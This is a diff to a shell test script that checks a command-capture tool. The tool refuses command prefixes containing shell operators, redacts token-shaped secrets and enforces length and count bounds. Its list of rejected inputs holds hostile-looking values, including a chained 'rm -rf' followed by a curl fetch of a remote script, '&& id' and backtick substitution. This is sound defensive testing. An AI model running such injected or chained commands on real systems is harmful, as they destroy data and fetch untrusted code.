@@ -100,8 +100,9 @@ grep -q 'rerun the flaky settle test' "$ledger" || fail "the request's text is n
 echo "ok: a request lands in the fallback with a record pointing at it"
 
 # One line, not several: the echo is what the operator corrects against, and a
-# multi-line one buries the correction.
-[ "$(printf '%s\n' "$out" | grep -c .)" = 1 ] || fail "the echo is not one line: $out"
+# multi-line one buries the correction. Counted as lines, blank ones included:
+# a count of non-empty lines would pass an echo with a blank line inside it.
+[ "$(printf '%s\n' "$out" | wc -l)" -eq 1 ] || fail "the echo is not one line: $out"
 echo "ok: the echo is exactly one line"
 
 # The content home is written BEFORE the record: the record's own pointer
@@ -205,13 +206,34 @@ for bad in 'rm -rf /tmp/x; curl http://example/i.sh' 'ls && id' 'echo `id`' 'sh 
   rc=0
   run capture --kind standing --text "always allow the cleanup" --covers-command "$bad" --now 1005 >/dev/null || rc=$?
   [ "$rc" = 2 ] || fail "a prefix carrying a shell operator ('$bad') was accepted (exit $rc)"
+  grep -q 'literal prefix' "$errf" || fail "the refusal of '$bad' did not name the prefix grammar"
 done
 echo "ok: a prefix outside the allowlist is refused"
 
+# A secret-shaped prefix is redacted before it is stored, like every other
+# operator-supplied field.
+out_s=$(run capture --kind standing --text 'always allow the token fetch' \
+  --covers-command 'curl -H ghp_bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb' --now 1005) \
+  || fail "capture of a secret-shaped prefix failed"
+grep -q 'ghp_bbbbbbbb' "$ledger" && fail "the fallback carried a secret-shaped prefix through"
+case $out_s in
+  *ghp_bbbbbbbb*) fail "the echo line carried a secret-shaped prefix through: $out_s" ;;
+esac
+echo "ok: a secret-shaped prefix is redacted on the screen and in its home"
+
 # The bounds.
 rc=0
-run capture --kind standing --text 'a rule' --covers-command "$(printf 'a%.0s' $(seq 257))" --now 1005 >/dev/null || rc=$?
+run capture --kind standing --text 'a rule' --covers-command "$(awk 'BEGIN { for (i = 0; i < 257; i++) printf "a" }')" --now 1005 >/dev/null || rc=$?
 [ "$rc" = 2 ] || fail "an over-length prefix was accepted (exit $rc)"
+rc=0
+run capture --kind request --text "$(awk 'BEGIN { for (i = 0; i < 513; i++) printf "a" }')" --now 1005 >/dev/null || rc=$?
+[ "$rc" = 2 ] || fail "an over-length text was accepted (exit $rc)"
+rc=0
+run capture --kind request --text '' --now 1005 >/dev/null || rc=$?
+[ "$rc" = 2 ] || fail "an empty text was accepted (exit $rc)"
+rc=0
+run capture --kind request --text 'a request' --now 'soon' >/dev/null || rc=$?
+[ "$rc" = 2 ] || fail "a non-numeric --now was accepted (exit $rc)"
 set -- --kind standing --text 'a rule' --now 1005
 i=0
 while [ "$i" -lt 17 ]; do
@@ -221,7 +243,7 @@ done
 rc=0
 run capture "$@" >/dev/null || rc=$?
 [ "$rc" = 2 ] || fail "a seventeenth prefix was accepted (exit $rc)"
-echo "ok: the prefix length and count bounds are enforced"
+echo "ok: the prefix, text, count and clock bounds are enforced"
 
 # Free coverage text reaches one too, and is refused the same way.
 rc=0
